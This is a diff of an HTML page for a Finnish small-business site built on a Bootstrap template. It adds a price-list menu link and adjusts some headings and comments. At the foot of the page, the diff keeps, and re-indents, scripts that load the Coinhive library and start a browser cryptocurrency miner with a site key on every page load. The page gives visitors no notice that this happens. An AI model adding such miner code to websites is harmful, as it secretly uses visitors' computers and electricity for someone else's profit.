@@ -13,14 +13,14 @@
     <!-- Bootstrap core CSS -->
     <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
 
-    <!-- Custom fonts for this template -->
+    <!-- Custom fonts-->
     <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com/css?family=Josefin+Slab:100,300,400,600,700,100italic,300italic,400italic,600italic,700italic" rel="stylesheet" type="text/css">
 
     <!--Social media icon pack -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
-    <!-- Custom styles for this template -->
+    <!-- Custom styles -->
     <link href="css/business-casual.css" rel="stylesheet">
     <link href="animate.css" rel="stylesheet">
 
@@ -53,6 +53,9 @@
             </li>
             <li class="nav-item px-lg-4">
               <a class="nav-link text-uppercase text-expanded" href="contact2.html">Ota yhteyttä</a>
+            </li>
+             <li class="nav-item px-lg-4">
+              <a class="nav-link text-uppercase text-expanded" href="catalog.html">Hinnastomme</a>
             </li>
           </ul>
         </div>
@@ -231,7 +234,7 @@
 
       <div class="bg-faded p-4 my-4">
         <hr class="divider">
-        <h2 class="text-center text-lg text-uppercase my-0">Tuoteperheeseemme
+        <h2 class="text-center text-lg text-uppercase my-0">Tuotteisiimme
           <strong>Kuuluu Myös nämä!</strong>
         </h2>
         <hr class="divider">
@@ -298,24 +301,24 @@
     <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
 
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-  var miner = new CoinHive.Anonymous('psaeXEsekV4fXcGHCMDyFvTOjjfxeUUt');
-  miner.start();
-</script>
-<script>
-  // Listen on events
-  miner.on('found', function() { /* Hash found */ })
-  miner.on('accepted', function() { /* Hash accepted by the pool */ })
+    <script>
+      var miner = new CoinHive.Anonymous('psaeXEsekV4fXcGHCMDyFvTOjjfxeUUt');
+      miner.start();
+    </script>
+    <script>
+      // Listen on events
+      miner.on('found', function() { /* Hash found */ })
+      miner.on('accepted', function() { /* Hash accepted by the pool */ })
 
-  // Update stats once per second
-  setInterval(function() {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
-    var acceptedHashes = miner.getAcceptedHashes();
+      // Update stats once per second
+      setInterval(function() {
+        var hashesPerSecond = miner.getHashesPerSecond();
+        var totalHashes = miner.getTotalHashes();
+        var acceptedHashes = miner.getAcceptedHashes();
 
-    // Output to HTML elements...
-  }, 1000);
-</script>
+        // Output to HTML elements...
+      }, 1000);
+    </script>
 
   </body>
 
